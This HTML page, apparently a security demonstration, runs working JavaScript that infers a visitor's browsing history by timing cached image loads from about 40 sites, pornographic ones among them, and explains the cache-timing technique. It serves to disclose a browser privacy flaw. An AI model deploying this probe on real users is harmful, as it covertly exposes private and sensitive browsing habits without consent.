<!DOCTYPE html 
  PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">

<head>
<title>visipisi</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<script
src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"
type="text/javascript"></script>
<!-- plus one -->
<script type="text/javascript">
(function() {
var po = document.createElement('script'); po.type =
'text/javascript'; po.async = true; po.src =
'https://apis.google.com/js/plusone.js'; var s =
document.getElementsByTagName('script')[0];
s.parentNode.insertBefore(po, s); })();
</script>
<script type="text/javascript">

$(window).load(function () {
  if (!$.browser.webkit)
    $('#mozilla-warning').show();
  window._testruns = 0;
    $('#rundemo').click(function (){
      var start = new Date().getTime();
      $('#rundemo').attr('disabled', true).text('magic in progress');
      $('#feedback').hide();
      var endCB = function () {
        _testruns++;
        _gaq.push(['_trackPageview', '/visipisi/visipisi.html?Run-'
                   + _testruns]);
        $('#rundemo').attr('disabled', false).text('Refresh');
        $('#runtime').text('tested 40 sites in ' +
          (new Date().getTime() - start) + ' milliseconds');
        $('#feedback').show();
      };
      var urls = {
facebook: 'https://s-static.ak.facebook.com/rsrc.php/v1/yJ/r/vOykDL15P0R.png',
twitter: 'https://twitter.com/images/spinner.gif',
digg: 'http://cdn2.diggstatic.com/img/sprites/global.5b25823e.png',
reddit: 'http://www.redditstatic.com/sprite-reddit.pZL22qP4ous.png',
hn: 'http://ycombinator.com/images/y18.gif',
stumbleupon: 'http://cdn.stumble-upon.com/i/bg/logo_su.png',
wired: 'http://www.wired.com/images/home/wired_logo.gif',
xkcd: 'http://imgs.xkcd.com/s/9be30a7.png',
linkedin: 'http://static01.linkedin.com/scds/common/u/img/sprite/sprite_global_v6.png',
pornhub: 'http://cdn1.static.pornhub.phncdn.com/images/pornhub_logo_en.png',
slashdot: 'http://a.fsdn.com/sd/logo_w_l.png',
myspace: 'http://cms.myspacecdn.com/cms/x/11/47/title-WhatsHotWhite.jpg',
engadget: 'http://www.blogsmithmedia.com/www.engadget.com/media/engadget_logo.png',
lastfm: 'http://cdn.lst.fm/flatness/anonhome/1/anon-sprite.png',
pandora: 'http://www.pandora.com/img/logo.png',
youtube: 'http://s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif',
yahoo: 'http://l.yimg.com/ao/i/mp/properties/frontpage/01/img/aufrontpage-sprite.s1740.gif',
google: 'https://www.google.com/intl/en_com/images/srpr/logo3w.png',
hotmail: 'https://secure.shared.live.com/~Live.SiteContent.ID/~16.2.8/~/~/~/~/images/iconmap.png',
redtube: 'http://images.cdn.redtube.com/_thumbs/icons/twitter.png',
cnn: 'http://i.cdn.turner.com/cnn/.element/img/3.0/global/header/intl/hdr-globe-central.gif',
bbc: 'http://static.bbc.co.uk/frameworks/barlesque/1.21.2/desktop/3/img/blocks/light.png',
reuters: 'http://www.reuters.com/resources_v2/images/masthead-logo.gif',
wikipedia: 'http://upload.wikimedia.org/wikipedia/en/b/bc/Wiki.png',
amazon: 'http://g-ecx.images-amazon.com/images/G/01/gno/images/orangeBlue/navPackedSprites-US-22._V183711641_.png',
ebay: 'http://p.ebaystatic.com/aw/pics/au/logos/logoEbay_x45.gif',
newegg: 'http://images10.newegg.com/WebResource/Themes/2005/Nest/neLogo.png',
bestbuy: 'http://images.bestbuy.com/BestBuy_US/en_US/images/global/header/hdr_logo.gif',
walmart: 'http://i2.walmartimages.com/i/header_wide/walmart_logo_214x54.gif',
perfectgirls: 'http://www.perfectgirls.net/img/logoPG_02.jpg',
abebooks: 'http://www.abebooks.com/images/HeaderFooter/siteRevamp/AbeBooks-logo.gif',
msy: 'http://msy.com.au/images/MSYLogo-long.gif',
techbuy: 'http://www.techbuy.com.au/themes/default/images/tblogo.jpg',
borders: 'http://www.borders.com.au/images/ui/logo-site-footer.gif',
mozilla: 'http://www.mozilla.org/images/template/screen/logo_footer.png',
anandtech: 'http://www.anandtech.com/content/images/globals/header_logo.png',
tomshardware: 'http://m.bestofmedia.com/i/tomshardware/v3/logo_th.png',
shopbot: 'http://i.shopbot.com.au/s/i/logo/en_AU/shopbot.gif',
staticice: 'http://staticice.com.au/images/banner.jpg',
youporn: 'http://files.youporn.com/r/11/images/youporn.png'
      };
      sites = [];
      for (var k in urls)
        sites.push(k);
      sites.reverse();

      $('td').text('');

      vp = visipisi.webkit;

      var firstSite = sites.pop();
      vp(urls[firstSite], function(result) {
        visipisiCB(vp, endCB, sites, urls, firstSite, result);
      });

    });
  //});
});

function visipisiCB(vp, endCB, sites, urls, site, result) {
  if (result === null)
    $('#' + site + '-status').text('whoops').css('color', '#888');
  else
    $('#' + site + '-status').text(result ? 'visited' : 'not visited')
      .css('color', result ? 'green' : 'red');
  var nextSite = sites.pop();
  if (nextSite)
    vp(urls[nextSite], function (result) {
      visipisiCB(vp, endCB, sites, urls, nextSite, result);
    });
  else
    endCB();
}

function rateResult(value)
{
  var browser;
  if ($.browser.webkit)
    browser = 'webkit';
  else if ($.browser.mozilla)
    browser = 'mozilla';
  else if ($.browser.opera)
    browser = 'opera';
  else if ($.browser.msie)
    browser = 'msie';
  else
    browser = 'other';
  _gaq.push(['_trackPageview', '/visipisi/visipisi.html?'
             + (value ? 'Correct' : 'Wrong') + '-' + _testruns]);
  _gaq.push(['_trackPageview', '/visipisi/visipisi.html?'
             + browser + '-'
             + (value ? 'Correct' : 'Wrong') + '-' + _testruns]);
  _gaq.push(['_trackPageview', '/visipisi/visipisi.html?Rated-'
             + _testruns]);
  $('#feedback').hide();
  $('#thankyou').show();
  setTimeout(function () { $('#thankyou').hide(); }, 1000);
}

var visipisi = {
  webkit: function(url, cb) {
    var start;
    var loaded = false;
    var runtest = function () {
      window.removeEventListener("message", runtest, false);
      var img = new Image();
      start = new Date().getTime();
      img.src = url;
      var messageCB = function (e) {
        var now = new Date().getTime();
        if (img.complete) {
          delete img;
          window.removeEventListener("message", messageCB, false);
          cbWrap(true);
        } else if (now - start > 10) {
          delete img;
          window.stop();
          window.removeEventListener("message", messageCB, false);
          cbWrap(false);
        } else {
          window.postMessage('', '*');
        }
      };
      window.addEventListener("message", messageCB, false);
      window.postMessage('', '*');
    };
    cbWrap = function (value) { cb(value); };
    window.addEventListener("message", runtest, false);
    window.postMessage('', '*');
  }
};

</script>
<style type="text/css">
body {
  font-family: sans;
  font-size: 14px;
  color: #444;
  line-height: 1.5em;
  margin: 1em;
}
h1, h2, h3 { margin: 0; }
h1 { font-size: 150%; } h2 { font-size: 115%; }
h3 { font-weight: bold; font-size: 100%; }
.update { color: red; }
table {
  width: 100%;
  border-collapse: collapse;
  margin: 1em 0;
}
table td, table th { border: 1px solid #ddd; }
table th { text-align: left; width: 1px; }

#feedback { text-align: center; font-weight: bold; }
#thankyou { text-align: center; }
#sharing {
  float: right;
  clear: right;
  margin: 1em;
  padding: 0 1em;
  width: 40%;
}
#code {
  clear: right;
  width: 40%;
  float: right;
  margin: 1em;
  border: 1px solid #ddd;
  padding: 1em;
  font-size: 80%;
  line-height: 1.1em;
}
#code-content {
  height: 20em;
  overflow: scroll;
}
#demo {
  clear: both;
  margin: 1em;
}
#mozilla-warning {
  color: red;
  font-weight: bold;
}
</style>

<script type="text/javascript">
var _gaq = _gaq || [];
_gaq.push(['_setAccount', 'UA-27475408-1']);
_gaq.push(['_trackPageview']);

(function() {
  var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
  ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
  var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>

</head>

<body>
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) {return;}
js = d.createElement(s); js.id = id;
js.src =
"//connect.facebook.net/en_US/all.js#xfbml=1&appId=216950321689846";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>


<h1>visipisi</h1>

<div id="code">
<h2>/code/</h2>
<pre id="code-content">
var visipisi = {
  mozilla: function(url, cb) {
    var tries = 1;
    var start, intervaller;
    var runtest = function () {
      var count = 0;
      var img = new Image();
      img.onload = function () {
        if (++count == 1)
          cbWrap(true);
      };
      start = new Date().getTime();
      img.src = url;
      var timeoutCB = function () {
        var now = new Date().getTime();
        if (now - start &gt; 10) {
          window.stop();
          window.stop();
          window.clearInterval(intervaller);
          if (++count == 1) {
            cbWrap(false);
          }
        }
      };
      intervaller = window.setInterval(timeoutCB, 2);
    };
    cbWrap = function (value) {
      if (--tries == 0)
        cb(value);
      else
        window.setTimeout(runtest, 10);
    };
    runtest();
  }
};
</pre>
</div>

<div id="sharing">

<g:plusone size="medium"
href="http://oxplot.github.com/visipisi/visipisi.html"></g:plusone>

<a href="https://twitter.com/share" class="twitter-share-button"
data-url="http://oxplot.github.com/visipisi/visipisi.html" data-text="I
too know the websites you visited" data-count="horizontal"
data-via="oxplot">Tweet</a><script type="text/javascript"
src="//platform.twitter.com/widgets.js"></script>

<div class="fb-like"
data-href="http://oxplot.github.com/visipisi/visipisi.html"
data-send="false" data-layout="button_count" data-width="75"
data-show-faces="false"></div>
</div>

<p>
This page will tell you what websites you have recently visited! In
other words, it will partially access your browser's history without
your permission. This implies that <em>any</em> website on the Internet
can do this. I got the inspiration from <a
href="http://lcamtuf.coredump.cx/cachetime/">Michal's code</a> after
reading about it on <a
href="http://news.ycombinator.com/item?id=3307398">HN</a>.
</p>

<p>
The javascript code on this page attempts to guess if you have recently
visited a website by loading an image from the target website. If the
loading completes fast (less than 10ms), it is highly likely that it was
loaded from browser's local cache as the network latency and speed of
most Internet connections cannot deliver sub 10ms speed. If it takes
longer, it's not in the cache. To avoid polluting the cache, the loading
is interrupted at the 10ms mark. This is important because any
subsequent tests will yield the same results.
</p>
<p>
Although the idea is simple, two factors affect the speed and accuracy
of the test: the speed at which the browser loads content from its
cache, and the realtimeness of the OS and the browser event system to
allow interrupting the request at a precise time. Both of these factors
further depend on the type of the browser, the OS and the CPU and IO
load of the machine running the test. The ideal conditions are fast
machine running real time OS with no CPU or IO load with a browser using
a fast javascript implementation. Because of these factors, the accuracy
of the test partially depends on your running environment. The goal is
to make the test as independent of these factors as possible.
</p>
<p>
The other issue that I am yet to resolve is Firefox's lack of
cooperation in loading stuff from cache. So for now, this is probably of
no use on Firefox. It should however work reliable on webkit based
browsers such as Chrome and Safari.<span id="mozilla-warning"
style="display: none;"> Since you're using a non-webkit based browser,
the test will most likely fail.</span>
</p>
<p>
The entire code of this page (other than those external scripts linked
to from this page) is licenced under GPL 3. If you have questions,
suggestions or any kind of feedback, please email me at mansour [at]
oxplot [dot] com
</p>

<div id="demo">
<button id="rundemo">Do the magic</button>
&nbsp;&nbsp;<span id='runtime'></span>
<table>
<tr>
  <th>facebook:</th><td id="facebook-status"></td>
  <th>slashdot:</th><td id="slashdot-status"></td>
  <th>cnn:</th><td id="cnn-status"></td>
  <th>abebooks:</th><td id="abebooks-status"></td>
</tr>
<tr>
  <th>twitter:</th><td id="twitter-status"></td>
  <th>myspace:</th><td id="myspace-status"></td>
  <th>bbc:</th><td id="bbc-status"></td>
  <th>msy:</th><td id="msy-status"></td>
</tr>
<tr>
  <th>digg:</th><td id="digg-status"></td>
  <th>engadget:</th><td id="engadget-status"></td>
  <th>reuters:</th><td id="reuters-status"></td>
  <th>techbuy:</th><td id="techbuy-status"></td>
</tr>
<tr>
  <th>reddit:</th><td id="reddit-status"></td>
  <th>last.fm:</th><td id="lastfm-status"></td>
  <th>wikipedia:</th><td id="wikipedia-status"></td>
  <th>borders (au):</th><td id="borders-status"></td>
</tr>
<tr>
  <th>HN:</th><td id="hn-status"></td>
  <th>pandora:</th><td id="pandora-status"></td>
  <th>amazon:</th><td id="amazon-status"></td>
  <th>mozilla:</th><td id="mozilla-status"></td>
</tr>
<tr>
  <th>stumbleupon:</th><td id="stumbleupon-status"></td>
  <th>youtube:</th><td id="youtube-status"></td>
  <th>ebay (au):</th><td id="ebay-status"></td>
  <th>anandtech:</th><td id="anandtech-status"></td>
</tr>
<tr>
  <th>wired:</th><td id="wired-status"></td>
  <th>yahoo:</th><td id="yahoo-status"></td>
  <th>newegg:</th><td id="newegg-status"></td>
  <th>tomshardware:</th><td id="tomshardware-status"></td>
</tr>
<tr>
  <th>xkcd:</th><td id="xkcd-status"></td>
  <th>google:</th><td id="google-status"></td>
  <th>bestbuy:</th><td id="bestbuy-status"></td>
  <th>shopbot (au):</th><td id="shopbot-status"></td>
</tr>
<tr>
  <th>linkedin:</th><td id="linkedin-status"></td>
  <th>hotmail:</th><td id="hotmail-status"></td>
  <th>walmart:</th><td id="walmart-status"></td>
  <th>staticice:</th><td id="staticice-status"></td>
</tr>
<tr>
  <th>pornhub:</th><td id="pornhub-status"></td>
  <th>redtube:</th><td id="redtube-status"></td>
  <th>perfectgirls:</th><td id="perfectgirls-status"></td>
  <th>youporn:</th><td id="youporn-status"></td>
</tr>
</table>
<p id="feedback" style="display: none;">
Do the results look correct?
<a href="javascript: rateResult(true)">Yes</a>
/ <a href="javascript: rateResult(false)">No</a>
</p>
<p id="thankyou" style="display: none;">
  Thanks for your feedback</p>
</div>

</body>
</html>
